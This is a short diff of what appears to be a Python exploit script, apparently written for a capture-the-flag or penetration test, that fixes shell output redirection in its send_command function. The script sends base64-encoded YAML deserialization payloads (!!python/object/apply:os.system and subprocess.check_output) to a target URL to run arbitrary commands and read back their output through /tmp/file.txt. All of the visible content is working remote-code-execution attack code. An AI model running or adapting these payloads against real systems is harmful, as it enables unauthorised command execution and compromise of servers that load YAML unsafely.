@@ -14,7 +14,7 @@ def def_handler(sig, frame):
     sys.exit(1)
 
 def send_command(cmd):
-    payload = base64.b64encode(("""yaml: !!python/object/apply:os.system ['%s 2>&1 > /tmp/file.txt']""" % cmd).encode())
+    payload = base64.b64encode(("""yaml: !!python/object/apply:os.system ['%s > /tmp/file.txt 2>&1']""" % cmd).encode())
     targeturl = URL + str(payload.decode())
     r = requests.get(targeturl)
     payload = base64.b64encode(("yaml: !!python/object/apply:subprocess.check_output [['cat','/tmp/file.txt']]").encode()) 
